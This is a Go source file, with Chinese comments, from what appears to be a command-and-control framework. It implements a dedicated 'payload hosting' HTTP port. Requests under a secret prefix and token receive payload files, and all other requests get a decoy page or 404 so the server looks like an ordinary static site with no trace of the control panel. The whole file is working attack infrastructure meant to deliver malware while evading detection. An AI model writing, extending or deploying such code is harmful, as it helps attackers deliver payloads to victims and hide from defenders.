// Package payloadhost 提供「载荷托管」的独立 HTTP 端口（v1.4.3 #15b-B）。
//
// 为什么需要它：C2 监听器端口是 TCP 与 HTTP **互斥**的（TCP 起得来就跳过 HTTP），
// 默认部署下监听器端口在跑 TSHL 帧，不可能同时应答 HTTP 下载。所以托管要么搭在
// 真的在跑的 HTTP 监听器上（见 listener.HTTPListener.SetPayloadHost），要么——更通用——
// 单独开一个端口，只干「下载载荷」这一件事，不暴露任何面板/API 痕迹。
//
// 该端口的响应策略：
//   - `/<prefix>/<token>/<文件名>` 交给注入的 Handler（认得就写响应、返回 true）；
//   - 其它一切请求交给 decoy（拟态诱饵页 / 404），对外表现为"一个普通静态站点"。
package payloadhost

import (
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Handler 处理前缀之后的子路径；返回 false 表示不认识（交由 decoy 回应）。
type Handler func(w http.ResponseWriter, r *http.Request, rest string) bool

// Server 是一个只读的载荷下载端口。
type Server struct {
	prefix  string
	handler Handler
	decoy   http.Handler

	mu  sync.Mutex
	srv *http.Server
	ln  net.Listener
}

// New 创建一个托管服务器。prefix 为空时按 "s" 处理；decoy 为 nil 时用 404。
func New(prefix string, h Handler, decoy http.Handler) *Server {
	p := strings.Trim(strings.TrimSpace(prefix), "/")
	if p == "" {
		p = "s"
	}
	if decoy == nil {
		decoy = http.NotFoundHandler()
	}
	return &Server{prefix: p, handler: h, decoy: decoy}
}

// Prefix 返回归一化后的路径前缀。
func (s *Server) Prefix() string { return s.prefix }

// Start 同步绑定 host:port（绑定失败立刻返回错误，便于调用方回退到面板地址）。
func (s *Server) Start(host string, port uint16) error {
	if host == "" {
		host = "0.0.0.0"
	}
	addr := fmt.Sprintf("%s:%d", host, port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("载荷托管端口 %s 绑定失败: %w", addr, err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", s.serve)

	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      300 * time.Second, // 载荷可能有几十 MB，写超时放宽
		IdleTimeout:       60 * time.Second,
	}

	s.mu.Lock()
	s.ln = ln
	s.srv = srv
	s.mu.Unlock()

	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[ERROR] [payload-host] %v\n", err)
		}
	}()
	return nil
}

// Stop 关闭监听（幂等）。
func (s *Server) Stop() {
	s.mu.Lock()
	srv, ln := s.srv, s.ln
	s.srv, s.ln = nil, nil
	s.mu.Unlock()
	if srv != nil {
		_ = srv.Close()
	}
	if ln != nil {
		_ = ln.Close()
	}
}

// serve 只认 GET/HEAD 的 /<prefix>/<...>，其余一律 decoy。
func (s *Server) serve(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet || r.Method == http.MethodHead {
		if rest := strings.TrimPrefix(r.URL.Path, "/"+s.prefix+"/"); rest != r.URL.Path && rest != "" {
			if s.handler != nil && s.handler(w, r, rest) {
				return
			}
		}
	}
	s.decoy.ServeHTTP(w, r)
}
